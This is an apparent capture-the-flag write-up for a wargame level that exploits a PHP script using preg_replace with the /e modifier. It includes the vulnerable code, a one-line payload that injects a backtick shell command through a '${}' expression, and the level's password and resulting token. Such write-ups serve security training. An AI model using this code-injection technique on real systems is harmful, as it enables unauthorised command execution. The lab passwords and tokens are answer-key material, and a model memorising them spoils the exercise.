`su level06 -> viuaaale9huek52boumoomioc`

We have a file named level06.php:

```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

This php script seems to read a file, replace some regular expression found in it with the result of the y function.

This script use preg_replace with the 'e' option which is a vulnerability.

We found on the internet that the /e modifier in the regular expression will cause PHP preg_replace() to eval our input matching the regex, in our case '[x .]', so we will write our code in place of the dot.

Using a second exploit, abusing the variable variables, PHP will execute what's written in ${}, thinking that `getflag` is a variable name, executing the function.

```bash
$ echo '[x ${`getflag`}]' > /tmp/flag06
$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```